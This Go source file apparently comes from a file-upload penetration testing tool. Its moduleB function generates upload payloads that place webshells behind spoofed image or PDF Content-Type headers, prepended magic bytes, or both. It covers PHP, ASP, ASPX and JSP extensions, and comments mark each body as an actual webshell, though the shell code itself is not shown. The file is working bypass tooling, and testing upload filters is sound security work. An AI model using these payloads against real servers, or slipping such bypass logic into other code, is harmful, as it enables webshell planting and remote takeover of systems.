package payload

// moduleB generates Content-Type spoofing and Magic Byte injection test payloads.
func moduleB() []*Payload {
	var tests []*Payload

	// B1: Content-Type header manipulation
	ctTests := []struct {
		ext         string
		spoofedType string
	}{
		{".php", "image/jpeg"},
		{".php", "image/png"},
		{".php", "image/gif"},
		{".php", "application/pdf"},
		{".php5", "image/jpeg"},
		{".phtml", "image/png"},
		{".phar", "image/gif"},
		{".jspx", "image/jpeg"},
		{".ashx", "application/pdf"},
		{".asp", "image/jpeg"},
		{".aspx", "image/png"},
		{".jsp", "image/gif"},
	}

	for _, ct := range ctTests {
		tests = append(tests, &Payload{
			TestType:    TestTypeContentTypeSpoof,
			Technique:   "Content-Type spoof: " + ct.ext + " as " + ct.spoofedType,
			Filename:    "upload" + ct.ext,
			Extension:   ct.ext,
			Body:        getPayloadForExtension(ct.ext), // ✅ ACTUAL WEBSHELL
			ContentType: ct.spoofedType,
			Tags:        []string{"content-type-spoof", ct.spoofedType},
		})
	}

	// B2: Magic byte injection (prepend file signatures to executable code)
	magicTests := []struct {
		name    string
		ext     string
		magic   []byte
		mimeRef string
	}{
		{
			name:    "PNG magic + .php",
			ext:     ".php",
			magic:   []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},
			mimeRef: "PNG",
		},
		{
			name:    "JPEG magic + .php",
			ext:     ".php",
			magic:   []byte{0xFF, 0xD8, 0xFF, 0xE0},
			mimeRef: "JPEG",
		},
		{
			name:    "GIF magic + .php",
			ext:     ".php",
			magic:   []byte("GIF89a"),
			mimeRef: "GIF",
		},
		{
			name:    "PDF magic + .php",
			ext:     ".php",
			magic:   []byte("%PDF-1.5"),
			mimeRef: "PDF",
		},
		{
			name:    "PNG magic + .php5",
			ext:     ".php5",
			magic:   []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},
			mimeRef: "PNG",
		},
		{
			name:    "JPEG magic + .phtml",
			ext:     ".phtml",
			magic:   []byte{0xFF, 0xD8, 0xFF, 0xE0},
			mimeRef: "JPEG",
		},
		{
			name:    "GIF magic + .phar",
			ext:     ".phar",
			magic:   []byte("GIF89a"),
			mimeRef: "GIF",
		},
		{
			name:    "PDF magic + .ashx",
			ext:     ".ashx",
			magic:   []byte("%PDF-1.5"),
			mimeRef: "PDF",
		},
		{
			name:    "PNG magic + .jspx",
			ext:     ".jspx",
			magic:   []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},
			mimeRef: "PNG",
		},
		{
			name:    "GIF magic + .asp",
			ext:     ".asp",
			magic:   []byte("GIF89a"),
			mimeRef: "GIF",
		},
	}

	for _, mt := range magicTests {
		// Get the actual executable payload
		shellcode := getPayloadForExtension(mt.ext)

		// Build body: magic bytes + newline + WEBSHELL (not benignContent)
		body := make([]byte, 0, len(mt.magic)+1+len(shellcode))
		body = append(body, mt.magic...)
		body = append(body, '\n')
		body = append(body, shellcode...) // ✅ ACTUAL WEBSHELL

		tests = append(tests, &Payload{
			TestType:    TestTypeMagicByteSpoof,
			Technique:   mt.name + " (magic byte injection)",
			Filename:    "image" + mt.ext,
			Extension:   mt.ext,
			Body:        body,
			ContentType: "",
			Tags:        []string{"magic-byte", mt.mimeRef, mt.ext},
		})
	}

	// B3: Combined Content-Type spoof + magic byte injection
	combined := []struct {
		ext     string
		magic   []byte
		cType   string
		mimeRef string
	}{
		{".php", []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}, "image/png", "PNG"},
		{".php", []byte{0xFF, 0xD8, 0xFF, 0xE0}, "image/jpeg", "JPEG"},
		{".php5", []byte("GIF89a"), "image/gif", "GIF"},
		{".phtml", []byte("%PDF-1.5"), "application/pdf", "PDF"},
	}

	for _, c := range combined {
		shellcode := getPayloadForExtension(c.ext)

		body := make([]byte, 0, len(c.magic)+1+len(shellcode))
		body = append(body, c.magic...)
		body = append(body, '\n')
		body = append(body, shellcode...) // ✅ ACTUAL WEBSHELL

		tests = append(tests, &Payload{
			TestType:    TestTypeMagicByteSpoof,
			Technique:   "Combined: " + c.ext + " with " + c.mimeRef + " magic + " + c.cType + " Content-Type",
			Filename:    "combined" + c.ext,
			Extension:   c.ext,
			Body:        body,
			ContentType: c.cType,
			Tags:        []string{"magic-byte", "content-type-spoof", c.mimeRef, c.ext},
		})
	}

	return tests
}
